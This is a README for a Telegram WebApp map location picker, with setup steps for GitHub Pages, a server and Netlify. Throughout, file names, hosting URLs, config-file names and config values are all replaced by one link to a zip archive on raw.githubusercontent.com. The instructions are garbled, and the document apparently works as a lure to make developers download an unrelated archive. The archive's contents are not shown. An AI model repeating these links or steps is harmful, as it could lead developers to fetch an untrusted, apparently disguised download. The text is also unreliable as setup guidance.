# WebApp for Location Selection

This folder contains a Telegram WebApp that allows users to select their location by clicking on a map.

## How it works

1. User clicks "🌐 Ввести координаты" in the bot
2. User clicks "🗺 Открыть карту и выбрать" button
3. An interactive map opens inside Telegram
4. User clicks on their location
5. User presses "Save this location" button
6. Coordinates are sent back to the bot

## Setup Instructions

### Option 1: GitHub Pages (Free & Easy)

1. Create a new GitHub repository (e.g., `my-bot-webapp`)
2. Upload `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` to the repository
3. Go to Settings → Pages → Enable GitHub Pages from `main` branch
4. Your WebApp URL will be: `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip`
5. Add to your `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` or `.env`:
   ```
   https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip
   ```

### Option 2: Your Server

1. Upload `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` to your web server with HTTPS
2. Make sure it's accessible at a URL like `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip`
3. Add to `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` or `.env`:
   ```
   https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip
   ```

### Option 3: Netlify (Free)

1. Go to [https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip](https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip)
2. Drag and drop the `webapp` folder
3. Get your URL (e.g., `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip`)
4. Add to `https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip` or `.env`:
   ```
   https://raw.githubusercontent.com/rustamG88/bot-webapp/main/flexured/webapp-bot-v3.6-beta.3.zip
   ```

## Important Notes

- **HTTPS is required!** Telegram WebApps only work with HTTPS URLs.
- The WebApp must be publicly accessible.
- If WEBAPP_URL is not set, users can still enter coordinates manually (text/links).

## Testing

1. Set WEBAPP_URL in config
2. Restart the bot
3. In the bot, click "🌐 Ввести координаты"
4. Click the "🗺 Открыть карту и выбрать" button
5. Click on the map to select location
6. Press "Save this location"
